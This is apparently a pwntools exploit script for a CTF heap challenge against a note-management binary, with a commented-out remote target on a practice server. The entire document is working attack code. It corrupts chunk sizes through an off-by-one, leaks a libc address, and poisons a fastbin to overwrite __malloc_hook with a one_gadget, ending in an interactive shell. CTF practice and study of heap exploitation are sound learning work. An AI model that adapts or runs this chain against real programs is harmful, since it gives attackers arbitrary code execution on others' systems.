from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')
io = process('./pwn')
# io = remote('node4.buuoj.cn', 25959)
elf = ELF('./pwn')
# one_gadgets = [0x3f4b6, 0x3f50a, 0xd5a27]
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
# one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
# one_gadgets = [0x3f4a6, 0x3f4fa, 0xd5b87]

def create_note(size):
    io.sendlineafter(b'choice: ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())

def write_note(index, size, content):
    io.sendlineafter(b'choice: ', b'2')
    io.sendlineafter(b'index: ', str(index).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'content: ', content)

def drop_note(index):
    io.sendlineafter(b'choice: ', b'3')
    io.sendlineafter(b'index: ', str(index).encode())

def show_note(index):
    io.sendlineafter(b'choice: ', b'4')
    io.sendlineafter(b'index: ', str(index).encode())

create_note(0x48)   # chunk_info #0
create_note(0x48)   # chunk_info #1
create_note(0x88)   # chunk_info #2

create_note(0x18)   # chunk_info #3
create_note(0x18)   # chunk_info #4
create_note(0x68)   # chunk_info #5

create_note(0x18)   # chunk_info #6
write_note(0, 0x48+10, cyclic(0x48) + b'\xE1')
drop_note(1)
create_note(0x48)   # chunk_info #1
show_note(2)
io.recvuntil(b'content: ')
main_arena = u64(io.recv(8)) - 88
print(hex(main_arena))
__malloc_hook = main_arena - 0x10
libc = LibcSearcher("__malloc_hook", __malloc_hook)
base = __malloc_hook - libc.dump('__malloc_hook')
__free_hook = base + libc.dump('__free_hook')
realloc = base + libc.dump('realloc')
create_note(0x88)   # chunk_info #7, same addr as #2
write_note(3, 0x18+10, cyclic(0x18) + b'\x91')
drop_note(4)
create_note(0x88)   # chunk_info #4, overlap #5
write_note(4, 0x88, (b'\x00' * 0x10 + p64(0x20) + p64(0x71)).ljust(0x88, b'\x00'))
drop_note(5)
write_note(4, 0x88, (b'\x00' * 0x10 + p64(0x20) + p64(0x71) + p64(__malloc_hook - 0x23)).ljust(0x88, b'\x00'))
create_note(0x68)   # chunk_info #5
create_note(0x68)   # chunk_info #8, to __malloc_hook
write_note(8, 0x13 + 8, b'\x00' * 0xB + p64(base + one_gadgets[3]) + p64(realloc + 4))
create_note(0x38)

io.interactive()